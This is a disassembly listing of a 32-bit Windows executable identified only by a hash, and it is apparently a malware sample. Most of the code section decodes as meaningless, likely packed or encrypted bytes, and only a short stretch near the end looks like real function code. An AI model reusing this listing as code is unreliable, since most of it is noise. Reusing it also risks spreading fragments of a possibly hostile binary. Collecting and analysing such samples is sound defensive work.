
e0a39ae6b207b24b32fd52a2a3819b0192bd23987ab9dbbafe104a4e32ce6909.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	jle    0x4cfffb
  4d0002:	mov    edi,0xd4275182
  4d0007:	mov    cl,0x75
  4d0009:	call   0xbc5a:0x3060a4f6
  4d0010:	ja     0x4cffad
  4d0012:	mov    ds:0xf576393d,eax
  4d0017:	add    bl,BYTE PTR [eax]
  4d0019:	loop   0x4cffb5
  4d001b:	lea    edx,[edi+eiz*8]
  4d001e:	call   0x75baf056
  4d0023:	scas   al,BYTE PTR es:[edi]
  4d0024:	push   cs
  4d0025:	push   ss
  4d0026:	dec    edi
  4d0027:	inc    esi
  4d0028:	fcomi  st,st(7)
  4d002a:	mov    al,0xb9
  4d002c:	mov    BYTE PTR es:[ecx-0x1d223ba9],cl
  4d0033:	fld    TBYTE PTR [edi+0x50]
  4d0036:	adc    DWORD PTR [eax-0x40295002],0x6af45084
  4d0040:	fidiv  WORD PTR [ebx+ecx*1]
  4d0043:	ins    BYTE PTR es:[edi],dx
  4d0044:	scas   al,BYTE PTR es:[edi]
  4d0045:	mov    ds:0xdd8fd6f8,eax
  4d004a:	jg     0x4d00c5
  4d004c:	jb     0x4cfff0
  4d004e:	test   BYTE PTR [esi+0x6c638905],al
  4d0054:	add    DWORD PTR [edi-0x64],esi
  4d0057:	lock mov edi,DWORD PTR [esi+0x1d]
  4d005b:	and    BYTE PTR [esi-0x7f],dh
  4d005e:	loop   0x4cffec
  4d0060:	jae    0x4d00d3
  4d0062:	and    BYTE PTR [ebx-0x72],dh
  4d0065:	pop    ss
  4d0066:	mov    DWORD PTR es:[ebp-0x22],edx
  4d006a:	inc    esp
  4d006b:	ficom  DWORD PTR [ebx+eiz*2]
  4d006e:	daa    
  4d006f:	xchg   edx,eax
  4d0070:	pop    esp
  4d0071:	add    eax,0x6b06d321
  4d0076:	xor    eax,DWORD PTR [eax+0x8d4eafa]
  4d007c:	or     eax,0x3a5f2b7f
  4d0081:	repz cmp DWORD PTR [esi],eax
  4d0084:	das    
  4d0085:	push   ebp
  4d0086:	sub    ebx,DWORD PTR [ebx+0x42]
  4d0089:	jmp    DWORD PTR [edi]
  4d008b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d008c:	adc    al,0x9
  4d008e:	popa   
  4d008f:	mov    ds:0x766379f1,al
  4d0094:	jp     0x4d005c
  4d0096:	add    al,0x8a
  4d0098:	xchg   edi,eax
  4d0099:	cmp    ebx,edi
  4d009b:	fisttp QWORD PTR [esi]
  4d009d:	int    0x4
  4d009f:	and    bl,BYTE PTR [ebp+0x33]
  4d00a2:	cli    
  4d00a3:	xor    esi,DWORD PTR [edi+edx*2-0x57132e02]
  4d00aa:	add    DWORD PTR [esi],ebp
  4d00ac:	gs in  al,0xb3
  4d00af:	mov    ds:0x174c1b95,al
  4d00b4:	adc    bl,ch
  4d00b6:	mov    bl,0xe8
  4d00b8:	in     al,0xb9
  4d00ba:	verr   WORD PTR [esi-0x47000fb5]
  4d00c1:	adc    dl,BYTE PTR [edi+0x51436d34]
  4d00c7:	lds    ebx,FWORD PTR [eax-0x5fdd5144]
  4d00cd:	dec    eax
  4d00ce:	push   ecx
  4d00cf:	fucomp st(4)
  4d00d1:	scas   eax,DWORD PTR es:[edi]
  4d00d2:	sbb    DWORD PTR [ebx],esp
  4d00d4:	jg     0x4d0126
  4d00d6:	in     eax,0x52
  4d00d8:	out    0x6,al
  4d00da:	sbb    al,BYTE PTR [ebx]
  4d00dc:	inc    ebx
  4d00dd:	test   BYTE PTR [ebx],dh
  4d00df:	sub    BYTE PTR gs:[eax+eiz*1-0xd],bh
  4d00e4:	fdivr  DWORD PTR [eax-0x6285a2fd]
  4d00ea:	push   ebx
  4d00eb:	mov    ds:0xb5048edc,al
  4d00f0:	and    al,0xc7
  4d00f2:	adc    esi,DWORD PTR [ebx]
  4d00f4:	push   es
  4d00f5:	cmp    al,0xec
  4d00f7:	int3   
  4d00f8:	xchg   BYTE PTR [edx],cl
  4d00fa:	push   eax
  4d00fb:	sar    BYTE PTR [edi-0x5],0x15
  4d00ff:	aaa    
  4d0100:	ret    0xea1a
  4d0103:	call   0x6f9bfcbc
  4d0108:	cmp    DWORD PTR [eax-0x3e],0xa7bbd81b
  4d010f:	call   0x17d545a5
  4d0114:	jo     0x4d00d0
  4d0116:	call   0x6d91e553
  4d011b:	xlat   BYTE PTR ds:[ebx]
  4d011c:	test   al,0x38
  4d011e:	(bad)  
  4d011f:	js     0x4d00ce
  4d0121:	xor    DWORD PTR ds:0x50cda7de,eax
  4d0127:	cs scas al,BYTE PTR es:[edi]
  4d0129:	pushf  
  4d012a:	mov    cl,0x28
  4d012c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d012d:	mov    ecx,0x41e6a6d9
  4d0132:	sbb    bh,dh
  4d0134:	jns    0x4d00f3
  4d0136:	cmp    ecx,DWORD PTR [esi]
  4d0138:	loopne 0x4d0107
  4d013a:	xchg   edx,eax
  4d013b:	cmc    
  4d013c:	push   0x6e
  4d013e:	cli    
  4d013f:	sub    DWORD PTR [edi+0x619c5d1c],0xffffff9a
  4d0146:	in     al,0x77
  4d0148:	mov    ds:0xa73f2b5d,eax
  4d014d:	test   al,0x34
  4d014f:	dec    esp
  4d0150:	mov    eax,ds:0xd474506b
  4d0155:	aad    0x3a
  4d0157:	shl    DWORD PTR ds:0x6a185af,cl
  4d015d:	cmp    DWORD PTR [ebx+eiz*2],ecx
  4d0160:	sti    
  4d0161:	(bad)  
  4d0162:	jle    0x4d01c9
  4d0164:	xchg   ecx,eax
  4d0165:	and    BYTE PTR [ebp+0x5a81e582],0x7d
  4d016c:	pop    ds
  4d016d:	cmc    
  4d016e:	mov    ecx,0xd11b5981
  4d0173:	std    
  4d0174:	mov    ah,0xe7
  4d0176:	sub    DWORD PTR [esi-0x63],ebx
  4d0179:	mov    ds:0xadb4f4aa,eax
  4d017e:	lods   al,BYTE PTR ds:[esi]
  4d017f:	pop    esp
  4d0180:	lahf   
  4d0181:	mov    esp,0x42b9f457
  4d0186:	(bad)  
  4d0187:	pop    ss
  4d0188:	mov    eax,ds:0x533fc1f0
  4d018d:	mov    edx,0x39794b9d
  4d0192:	pop    es
  4d0193:	mov    ah,0xdd
  4d0195:	rcl    BYTE PTR [eax-0x53],cl
  4d0198:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d0199:	hlt    
  4d019a:	xlat   BYTE PTR ds:[ebx]
  4d019b:	xor    al,0xb
  4d019d:	hlt    
  4d019e:	xor    ecx,esp
  4d01a0:	test   BYTE PTR [ebx],0xb4
  4d01a3:	mov    ch,0xb
  4d01a5:	hlt    
  4d01a6:	dec    ebx
  4d01a7:	mov    ds:0x5df40c5e,al
  4d01ac:	mov    ds:0xb40a81f2,eax
  4d01b1:	cwde   
  4d01b2:	jns    0x4d0135
  4d01b4:	cmp    eax,0xc4829150
  4d01b9:	scas   eax,DWORD PTR es:[edi]
  4d01ba:	sar    BYTE PTR [edx+esi*2-0x80],cl
  4d01be:	sub    eax,0x5dd78f83
  4d01c3:	mov    ebp,0x4ee2b37e
  4d01c8:	mov    esp,0x492535a4
  4d01cd:	out    0xca,al
  4d01cf:	lds    ebp,FWORD PTR [edi+0x555e41a5]
  4d01d5:	mov    ds:0x851d2cfa,eax
  4d01da:	or     dl,cl
  4d01dc:	ins    DWORD PTR es:[edi],dx
  4d01dd:	repz movsx eax,WORD PTR [ecx+ebp*1]
  4d01e2:	push   esi
  4d01e3:	cmp    BYTE PTR [esi],bh
  4d01e5:	in     eax,dx
  4d01e6:	test   eax,0xba1f38e7
  4d01eb:	mov    ecx,0x4645e0e1
  4d01f0:	stos   DWORD PTR es:[edi],eax
  4d01f1:	pop    edi
  4d01f2:	jmp    0x4713:0x14a8ce42
  4d01f9:	aas    
  4d01fa:	(bad)  
  4d01fb:	out    dx,eax
  4d01fc:	mov    edx,0x9fd9fac0
  4d0201:	enter  0x4a79,0x7e
  4d0205:	cwde   
  4d0206:	(bad)  
  4d0207:	popf   
  4d0208:	shr    BYTE PTR [ebx+0x29],0x62
  4d020c:	cdq    
  4d020d:	adc    eax,0xec68f64f
  4d0212:	mov    al,0x9
  4d0214:	push   cs
  4d0215:	and    ebx,edx
  4d0217:	cli    
  4d0218:	pop    ss
  4d0219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d021a:	sub    ch,BYTE PTR [ecx]
  4d021c:	jmp    0x4f19:0x16d6d55b
  4d0223:	sub    eax,0x96711a3b
  4d0228:	es jno 0x4d01ad
  4d022b:	ins    DWORD PTR es:[edi],dx
  4d022c:	push   ecx
  4d022d:	retf   
  4d022e:	or     BYTE PTR [ecx+0x30],cl
  4d0231:	xor    eax,0xc156b6f7
  4d0236:	jge    0x4d01f4
  4d0238:	scas   al,BYTE PTR es:[edi]
  4d0239:	xor    DWORD PTR [esi],ecx
  4d023b:	ret    0x535f
  4d023e:	icebp  
  4d023f:	mov    dl,0xc
  4d0241:	mov    al,0x9
  4d0243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0244:	hlt    
  4d0245:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0246:	cli    
  4d0247:	(bad)  
  4d0249:	iret   
  4d024a:	or     DWORD PTR [edi+0x33],esi
  4d024d:	xchg   dh,dh
  4d024f:	fsub   DWORD PTR [eax*1-0x121fc880]
  4d0256:	or     eax,edi
  4d0258:	into   
  4d0259:	xchg   edi,eax
  4d025a:	mov    ah,0xae
  4d025c:	cs xchg esp,eax
  4d025e:	inc    edx
  4d025f:	frstor [ecx-0x4b8cf136]
  4d0265:	lahf   
  4d0266:	cmc    
  4d0267:	frstor [edi+ebx*2+0x2bb32e60]
  4d026e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d026f:	push   esi
  4d0270:	push   cs
  4d0271:	gs jmp 0xcbff:0xa2ab3934
  4d0279:	stos   DWORD PTR es:[edi],eax
  4d027a:	or     al,BYTE PTR [esi+0x2310c8f6]
  4d0280:	or     esi,DWORD PTR [edi]
  4d0282:	out    dx,eax
  4d0283:	pop    esp
  4d0284:	imul   ecx,ebp,0xffffff9d
  4d0287:	out    0x99,eax
  4d0289:	xor    al,0x87
  4d028b:	pop    ss
  4d028c:	addr16 retf 
  4d028e:	clc    
  4d028f:	cmp    BYTE PTR [ecx+0x67db2ba9],bl
  4d0295:	lods   al,BYTE PTR ds:[esi]
  4d0296:	fmul   st(7),st
  4d0298:	test   DWORD PTR [ebx+eax*4],esi
  4d029b:	mov    ss,esp
  4d029d:	and    al,0xd1
  4d029f:	sar    DWORD PTR [esi+0x32],0x2e
  4d02a3:	xchg   esp,eax
  4d02a4:	(bad)  
  4d02a5:	and    eax,0xc5863255
  4d02aa:	cmp    ch,BYTE PTR [edi]
  4d02ac:	ds fwait
  4d02ae:	push   eax
  4d02af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d02b0:	dec    esi
  4d02b1:	push   edi
  4d02b2:	mov    bl,0xd1
  4d02b4:	out    dx,eax
  4d02b5:	shl    DWORD PTR [edx+0x6cfe9762],cl
  4d02bb:	and    edi,edi
  4d02bd:	add    DWORD PTR [ebx+0x118c8dde],edx
  4d02c3:	and    dh,BYTE PTR [ebx+esi*2+0x79]
  4d02c7:	xchg   esp,eax
  4d02c8:	sub    eax,0x596b868d
  4d02cd:	imul   ecx,DWORD PTR [ecx+0x76972918],0x375bdbe7
  4d02d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d02d8:	push   ds
  4d02d9:	test   al,0xc3
  4d02db:	lods   al,BYTE PTR ds:[esi]
  4d02dc:	outs   dx,BYTE PTR ds:[esi]
  4d02dd:	sbb    al,0x8d
  4d02df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d02e0:	in     eax,0x33
  4d02e2:	fstp   QWORD PTR [edi-0x7c]
  4d02e5:	int3   
  4d02e6:	xor    ah,BYTE PTR [eax+0x48508a7d]
  4d02ec:	mov    ch,al
  4d02ee:	sbb    DWORD PTR [ecx+eiz*8+0x2043f63a],edi
  4d02f5:	sbb    al,0x8b
  4d02f7:	rol    BYTE PTR ds:0xfc3f84e4,0x1a
  4d02fe:	ror    esp,1
  4d0300:	add    al,0x3b
  4d0302:	cmp    ecx,DWORD PTR [ebp+0x3af07256]
  4d0308:	cld    
  4d0309:	sbb    al,bl
  4d030b:	xchg   esi,eax
  4d030c:	out    dx,al
  4d030d:	push   0x11
  4d030f:	outs   dx,BYTE PTR ds:[esi]
  4d0310:	inc    esi
  4d0311:	push   ebp
  4d0312:	push   ebp
  4d0313:	aas    
  4d0314:	and    DWORD PTR [ebx+ebp*4-0x10],edx
  4d0318:	push   esp
  4d0319:	mov    ah,0x79
  4d031b:	push   cs
  4d031c:	mov    esp,0x59f2864b
  4d0321:	mov    ebx,0xd201fc5b
  4d0326:	call   0x69cc0752
  4d032b:	sub    ah,bh
  4d032d:	mov    cl,0xfe
  4d032f:	xlat   BYTE PTR ds:[ebx]
  4d0330:	adc    eax,0x6f7f014e
  4d0335:	call   0x2f64:0x9691d103
  4d033c:	sub    BYTE PTR [ecx-0x65],0x27
  4d0340:	add    bl,BYTE PTR [ebx+0x650fd888]
  4d0346:	ja     0x4d036e
  4d0348:	inc    edi
  4d0349:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d034a:	xchg   DWORD PTR [edi],ebp
  4d034c:	(bad)  
  4d034d:	mov    dl,0xd1
  4d034f:	sub    BYTE PTR [ebx-0x10b3082e],dl
  4d0355:	mov    cs,ebx
  4d0357:	adc    edi,ebp
  4d0359:	js     0x4d033c
  4d035b:	into   
  4d035c:	add    DWORD PTR ds:0x76c33453,edx
  4d0362:	xchg   ebp,eax
  4d0363:	push   edi
  4d0364:	xor    DWORD PTR [ebx+0x7b],eax
  4d0367:	test   al,0xd0
  4d0369:	mov    esp,0x4330436c
  4d036e:	xchg   ebx,eax
  4d036f:	jbe    0x4d0361
  4d0371:	mov    esp,0x24f9896c
  4d0376:	xchg   ebx,eax
  4d0377:	jbe    0x4d0380
  4d0379:	xor    ah,BYTE PTR [esi]
  4d037b:	xchg   ecx,eax
  4d037c:	cli    
  4d037d:	int    0xd9
  4d037f:	push   esi
  4d0380:	fnsave [ecx]
  4d0382:	es test eax,0x8b659eaf
  4d0388:	jbe    0x4d03a4
  4d038a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d038b:	je     0x4d0318
  4d038d:	in     eax,0x43
  4d038f:	push   ebx
  4d0390:	jne    0x4d03ac
  4d0392:	mov    esp,0xe718a38
  4d0397:	mov    al,0x35
  4d0399:	mov    ?,ecx
  4d039b:	dec    edi
  4d039c:	push   DWORD PTR [ecx]
  4d039e:	pop    edi
  4d039f:	jno    0x4d036b
  4d03a1:	aad    0x61
  4d03a3:	xchg   ebx,eax
  4d03a4:	pop    ebx
  4d03a5:	aaa    
  4d03a6:	lahf   
  4d03a7:	jo     0x4d0373
  4d03a9:	je     0x4d0390
  4d03ab:	dec    edi
  4d03ac:	lods   al,BYTE PTR ds:[esi]
  4d03ad:	jl     0x4d0422
  4d03af:	cmp    ecx,DWORD PTR [edi+edi*4+0x51]
  4d03b3:	cmp    DWORD PTR [eax-0x2b5bdc76],edi
  4d03b9:	test   eax,0x56371500
  4d03be:	(bad)  
  4d03bf:	jmp    0xd04e:0x15003fb2
  4d03c6:	mov    dh,0xf7
  4d03c8:	or     DWORD PTR [esi+0x7200c19a],ecx
  4d03ce:	gs ds jmp 0x180e9de8
  4d03d5:	inc    esi
  4d03d6:	dec    esi
  4d03d7:	mov    esi,0xcbb1b9e9
  4d03dc:	mov    WORD PTR [edx+0x6a],gs
  4d03df:	xchg   ebp,eax
  4d03e0:	cmp    bh,ah
  4d03e2:	push   esi
  4d03e3:	push   ebx
  4d03e4:	out    0xd1,al
  4d03e6:	leave  
  4d03e7:	lods   al,BYTE PTR ds:[esi]
  4d03e8:	sbb    ebp,DWORD PTR [esi]
  4d03ea:	jle    0x4d03b3
  4d03ec:	push   ss
  4d03ed:	mov    eax,DWORD PTR [eax+edi*1+0x3bc374eb]
  4d03f4:	ds inc esp
  4d03f6:	pop    ebp
  4d03f7:	(bad)
  4d03fb:	scas   eax,DWORD PTR es:[edi]
  4d03fc:	pop    esi
  4d03fd:	std    
  4d03fe:	sbb    DWORD PTR [eax-0x5d],edx
  4d0401:	add    ch,BYTE PTR [esi]
  4d0403:	and    al,0x76
  4d0405:	mov    dh,0x12
  4d0407:	fmul   QWORD PTR [ebx-0x7967cab7]
  4d040d:	outs   dx,DWORD PTR ds:[esi]
  4d040e:	iret   
  4d040f:	addr16 jnp 0x4d03a2
  4d0412:	js     0x4d0420
  4d0414:	mov    gs,WORD PTR [eax]
  4d0416:	enter  0x73f3,0xd7
  4d041a:	jg     0x4d039c
  4d041c:	mov    ?,WORD PTR [ebx-0x52c926bf]
  4d0422:	dec    ecx
  4d0423:	jl     0x4d0460
  4d0425:	aam    0xa8
  4d0427:	adc    eax,0x75cf71b0
  4d042c:	sahf   
  4d042d:	idiv   BYTE PTR [ebx-0x63791978]
  4d0433:	ja     0x4d03c4
  4d0435:	jl     0x4d049b
  4d0437:	std    
  4d0438:	retf   0xe10e
  4d043b:	bound  edi,QWORD PTR [ecx+esi*4-0x6b314d6d]
  4d0442:	test   al,0x9f
  4d0444:	in     eax,dx
  4d0445:	outs   dx,DWORD PTR ds:[esi]
  4d0446:	push   edi
  4d0447:	pusha  
  4d0448:	adc    al,0x78
  4d044a:	dec    esi
  4d044b:	mov    eax,ds:0x620b87ed
  4d0450:	add    al,0x7c
  4d0452:	in     al,dx
  4d0453:	leave  
  4d0454:	lds    edi,FWORD PTR [edi+0x4db18e88]
  4d045a:	jp     0x4d0442
  4d045c:	lods   al,BYTE PTR ds:[esi]
  4d045d:	mov    ch,0x2
  4d045f:	jbe    0x4d03e1
  4d0461:	xchg   edi,eax
  4d0462:	pop    ecx
  4d0463:	cmovp  ebx,ebp
  4d0466:	mov    cl,0x9d
  4d0468:	pop    es
  4d0469:	push   esi
  4d046a:	adc    BYTE PTR [ebp+0x46d92da5],bh
  4d0470:	ds mov dh,0x88
  4d0473:	jl     0x4d0498
  4d0475:	int    0xf4
  4d0477:	iret   
  4d0478:	fisub  WORD PTR [esi+0x5932181d]
  4d047e:	loop   0x4d0467
  4d0480:	pop    edx
  4d0481:	and    al,0x72
  4d0483:	popf   
  4d0484:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0485:	push   eax
  4d0486:	xchg   esp,eax
  4d0487:	or     eax,0xf26c5343
  4d048c:	mov    esi,0x426e570d
  4d0491:	dec    eax
  4d0492:	in     eax,0x1c
  4d0494:	xchg   edi,eax
  4d0495:	inc    ebx
  4d0496:	nop
  4d0497:	das    
  4d0498:	cmc    
  4d0499:	add    eax,eax
  4d049b:	and    BYTE PTR [esi+eiz*2+0x40],bl
  4d049f:	fbstp  TBYTE PTR [ecx-0x5adfed67]
  4d04a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d04a6:	inc    esi
  4d04a7:	xor    bh,ah
  4d04a9:	push   ecx
  4d04aa:	lods   eax,DWORD PTR ds:[esi]
  4d04ab:	je     0x4d04af
  4d04ad:	out    0x52,eax
  4d04af:	mov    edi,edi
  4d04b1:	pusha  
  4d04b2:	ss mov ecx,0x3f54bf26
  4d04b8:	push   0x99c5684d
  4d04bd:	mov    dl,0x97
  4d04bf:	sahf   
  4d04c0:	or     DWORD PTR [esi+0x68],esp
  4d04c3:	popa   
  4d04c4:	clc    
  4d04c5:	and    al,0x8
  4d04c7:	retf   
  4d04c8:	pop    edx
  4d04c9:	inc    ebx
  4d04ca:	clc    
  4d04cb:	xor    al,0xb3
  4d04cd:	mov    esp,0x83a3ca5a
  4d04d2:	xor    al,BYTE PTR [edx+0x16]
  4d04d5:	or     al,0xcf
  4d04d7:	or     eax,0xeabcc376
  4d04dc:	jle    0x4d04c0
  4d04de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04df:	mov    dh,0x9b
  4d04e1:	sbb    eax,0x22f54958
  4d04e6:	aam    0x17
  4d04e8:	iret   
  4d04e9:	cmp    eax,0xc452d4ad
  4d04ee:	push   edx
  4d04ef:	sub    edx,DWORD PTR [edi]
  4d04f1:	pusha  
  4d04f2:	scas   eax,DWORD PTR es:[edi]
  4d04f3:	aam    0xea
  4d04f5:	rol    BYTE PTR [esi-0x6a],cl
  4d04f8:	pop    ss
  4d04f9:	xchg   edi,eax
  4d04fa:	shr    DWORD PTR [eax+0x3f],0x85
  4d04fe:	leave  
  4d04ff:	outs   dx,DWORD PTR ds:[esi]
  4d0500:	push   ss
  4d0501:	into   
  4d0502:	xor    eax,0xebd1fe6
  4d0507:	inc    BYTE PTR ds:[ebp+0x31]
  4d050b:	dec    BYTE PTR [esi+0x73028f3a]
  4d0511:	(bad)
  4d0514:	add    bh,BYTE PTR [eax+edx*2]
  4d0517:	xchg   esi,eax
  4d0518:	push   edx
  4d0519:	ret    
  4d051a:	add    eax,0x6ffd34a2
  4d051f:	inc    ebx
  4d0520:	and    BYTE PTR [edx],al
  4d0522:	out    0xd4,al
  4d0524:	(bad)
  4d0529:	cmp    eax,0xde86474a
  4d052e:	push   ss
  4d052f:	jl     0x4d050c
  4d0531:	mov    DWORD PTR [ebp-0x10],edx
  4d0534:	es jbe 0x4d0549
  4d0537:	or     BYTE PTR [edi-0x48],0x51
  4d053b:	out    0x1f,al
  4d053d:	mov    ebx,0x44367d24
  4d0542:	xor    DWORD PTR [edi-0x7ebb83b0],eax
  4d0548:	add    eax,0x817f1183
  4d054d:	cmp    eax,0xc2eace63
  4d0552:	add    al,0x9b
  4d0554:	test   DWORD PTR [ecx-0x3a1d329f],esi
  4d055a:	push   cs
  4d055b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d055c:	jae    0x4d04e8
  4d055e:	lock mov al,0x96
  4d0561:	clc    
  4d0562:	rcr    DWORD PTR [ebx-0xa],cl
  4d0565:	idiv   DWORD PTR [eax+edi*8+0x75]
  4d0569:	dec    eax
  4d056a:	in     eax,dx
  4d056b:	push   cs
  4d056c:	loop   0x4d0524
  4d056e:	push   0xeb9977fd
  4d0573:	push   edx
  4d0574:	hlt    
  4d0575:	ins    DWORD PTR es:[edi],dx
  4d0576:	push   0xffffff95
  4d0578:	xor    edx,DWORD PTR [edx-0x55a6956b]
  4d057e:	mov    ss,WORD PTR [esi]
  4d0580:	outs   dx,DWORD PTR ds:[esi]
  4d0581:	push   0x192e971
  4d0586:	xchg   esi,eax
  4d0587:	outs   dx,DWORD PTR ds:[esi]
  4d0588:	bound  esp,QWORD PTR [ebx+0x8651bb1]
  4d058e:	fsub   QWORD PTR [edx-0x6b]
  4d0591:	test   al,0x8c
  4d0593:	inc    edi
  4d0594:	les    eax,FWORD PTR [edx]
  4d0596:	and    al,0x7c
  4d0598:	out    0xfc,eax
  4d059a:	xor    DWORD PTR [eax+0x7c928672],edx
  4d05a0:	lock cmp al,0xc6
  4d05a3:	and    cl,0x18
  4d05a6:	and    bl,BYTE PTR [eax+eiz*1]
  4d05a9:	out    0xdd,eax
  4d05ab:	inc    eax
  4d05ac:	outs   dx,BYTE PTR ds:[esi]
  4d05ad:	pop    esi
  4d05ae:	xchg   edx,eax
  4d05af:	inc    edx
  4d05b0:	push   ebx
  4d05b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d05b2:	test   BYTE PTR [ecx],0xd2
  4d05b5:	imul   esp,DWORD PTR [esi-0x2],0x199962f
  4d05bc:	shr    BYTE PTR [ecx-0x32],cl
  4d05bf:	(bad)  
  4d05c0:	das    
  4d05c1:	xchg   esi,eax
  4d05c2:	xor    esp,eax
  4d05c4:	cmp    BYTE PTR [ebp-0x4f7c5d3c],bl
  4d05ca:	xchg   ebp,eax
  4d05cb:	ret    
  4d05cc:	sub    esi,DWORD PTR [esi+0x524a0c9d]
  4d05d2:	jecxz  0x4d05b5
  4d05d4:	mov    ecx,0x331e1cbd
  4d05d9:	xor    BYTE PTR [ecx+0x40],dh
  4d05dc:	int3   
  4d05dd:	push   esp
  4d05de:	mov    ?,WORD PTR ds:0x4e83726
  4d05e4:	inc    ecx
  4d05e5:	sub    DWORD PTR [eax+0x40],0x4d
  4d05e9:	mov    cl,0xb5
  4d05eb:	and    eax,0xaa7db561
  4d05f0:	adc    eax,0x1fa7462b
  4d05f5:	sahf   
  4d05f6:	sti    
  4d05f7:	and    DWORD PTR [edx+ebx*8+0x105ff008],0xffffffef
  4d05ff:	inc    ebx
  4d0600:	(bad)  
  4d0602:	rcr    BYTE PTR [esi-0x130f9965],cl
  4d0608:	jecxz  0x4d060b
  4d060a:	jp     0x4d0623
  4d060c:	xchg   dh,bh
  4d060e:	xchg   ebp,eax
  4d060f:	call   0x18215e8f
  4d0614:	test   ebp,edi
  4d0616:	cmp    esi,DWORD PTR [ebx+0x6c]
  4d0619:	test   BYTE PTR [eax+0x4f7b9691],dh
  4d061f:	stc    
  4d0620:	addr16 in eax,dx
  4d0622:	mov    ah,0x7
  4d0624:	call   0x7e43:0x664ba212
  4d062b:	push   ds
  4d062c:	fwait
  4d062d:	and    al,0x2
  4d062f:	loop   0x4d0697
  4d0631:	(bad)  [edi+0x21]
  4d0634:	add    eax,0x64e00225
  4d0639:	(bad)  
  4d063b:	pop    ds
  4d063c:	sbb    eax,0x836017c
  4d0641:	add    eax,0xfafacec3
  4d0646:	cmp    al,0xf4
  4d0648:	xchg   edi,eax
  4d0649:	pop    ebp
  4d064a:	ret    0x65dc
  4d064d:	ja     0x4d062f
  4d064f:	test   BYTE PTR [esi],ah
  4d0651:	lds    esp,FWORD PTR [ebx]
  4d0653:	enter  0xf328,0x8b
  4d0657:	add    al,0xb6
  4d0659:	dec    eax
  4d065a:	or     eax,0x3b436b82
  4d065f:	loopne 0x4d06d8
  4d0661:	das    
  4d0662:	sahf   
  4d0663:	cmp    ebp,DWORD PTR [edx-0x73]
  4d0666:	inc    eax
  4d0667:	xor    DWORD PTR [edx],esi
  4d0669:	and    DWORD PTR [ebx+eiz*4-0x71],ebx
  4d066d:	add    ch,ch
  4d066f:	clc    
  4d0670:	dec    edx
  4d0671:	imul   eax,eax,0x1e
  4d0674:	mov    ch,0x5e
  4d0676:	jmp    0x77c2:0xb00d9266
  4d067d:	jne    0x4d06da
  4d067f:	in     al,0x43
  4d0681:	jno    0x4d063e
  4d0683:	sbb    al,0xfe
  4d0685:	stos   BYTE PTR es:[edi],al
  4d0686:	inc    ebp
  4d0687:	outs   dx,BYTE PTR ds:[esi]
  4d0688:	mov    esi,0xd0599c9d
  4d068d:	and    eax,eax
  4d068f:	int3   
  4d0690:	xor    esi,DWORD PTR [ecx+0x7f]
  4d0693:	jmp    0x7133:0x15808ece
  4d069a:	jg     0x4d0686
  4d069c:	into   
  4d069d:	mov    es,WORD PTR [eax+0x7f713315]
  4d06a3:	jmp    0x7133:0x15808ece
  4d06aa:	jg     0x4d0696
  4d06ac:	into   
  4d06ad:	mov    es,WORD PTR [eax+0x7fd23315]
  4d06b3:	jmp    0x7e33:0x158585ce
  4d06ba:	jp     0x4d06a6
  4d06bc:	push   edi
  4d06bd:	mov    ah,BYTE PTR [ebx+ecx*1+0x15]
  4d06c1:	push   ss
  4d06c2:	mov    DWORD PTR [ebp+0x65adfeaf],ebp
  4d06c8:	xchg   esi,eax
  4d06c9:	popf   
  4d06ca:	jo     0x4d0745
  4d06cc:	mov    eax,DWORD PTR [edx-0x6c]
  4d06cf:	(bad)  
  4d06d0:	mov    edx,0x5dc45eb4
  4d06d5:	out    0xa9,al
  4d06d7:	mov    ebp,0x54a50d92
  4d06dc:	xchg   BYTE PTR [edi-0x1950933e],dh
  4d06e2:	lea    eax,[eax+0x16]
  4d06e5:	pushf  
  4d06e6:	add    al,0x1c
  4d06e8:	adc    BYTE PTR [edx],0x45
  4d06eb:	neg    BYTE PTR [edi-0x1]
  4d06ee:	adc    eax,0x4d2004
  4d06f3:	call   edi
  4d06f5:	add    BYTE PTR [eax],al
  4d06f7:	add    BYTE PTR [edi-0x1],bl
  4d06fa:	adc    eax,0x4d200c
  4d06ff:	call   edi
  4d0701:	add    BYTE PTR [eax],al
  4d0703:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0709:	sub    esp,0x2c
  4d070c:	mov    eax,0x4d3094
  4d0711:	mov    ecx,DWORD PTR [eax+0x120]
  4d0717:	push   eax
  4d0718:	mov    eax,0x0
  4d071d:	push   eax
  4d071e:	call   0x4d0cf0
  4d0723:	add    esp,0x4
  4d0726:	pop    eax
  4d0727:	push   eax
  4d0728:	push   DWORD PTR [eax+0x1a8]
  4d072e:	push   edi
  4d072f:	push   edx
  4d0730:	push   esi
  4d0731:	call   0x4d0d08
  4d0736:	add    esp,0x10
  4d0739:	pop    eax
  4d073a:	push   eax
  4d073b:	push   0xfffffff4
  4d073d:	call   0x4d1000
  4d0742:	add    esp,0x4
  4d0745:	pop    eax
  4d0746:	add    esp,0x2c
  4d0749:	pop    ebp
  4d074a:	ret    
  4d074b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0751:	sub    esp,0x58
  4d0754:	lea    ecx,ds:0x4d3160
  4d075a:	adc    edx,0xffffffba
  4d075d:	push   ecx
  4d075e:	push   0x0
  4d0760:	call   0x4d1340
  4d0765:	add    esp,0x4
  4d0768:	pop    ecx
  4d0769:	push   ecx
  4d076a:	push   DWORD PTR [ecx+0x120]
  4d0770:	push   edx
